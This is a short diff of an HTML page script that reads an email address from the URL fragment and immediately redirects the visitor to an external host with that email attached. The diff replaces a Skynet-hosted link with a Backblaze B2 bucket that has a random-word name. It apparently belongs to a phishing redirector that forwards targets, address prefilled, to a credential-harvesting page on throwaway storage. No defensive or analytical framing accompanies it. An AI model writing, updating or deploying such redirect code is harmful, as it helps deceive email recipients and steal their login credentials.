@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://siasky.net/LAB0Czr48wH1b1KQG9TMRAS6WMQ3H4napMf0lp9bu8zTzQ?key=358ed89e99937e09bbabbcbdeff29acd&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
+			window.location.href = "https://bourgeoisify-choledoch-nihilism.s3.eu-central-003.backblazeb2.com/index.html"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
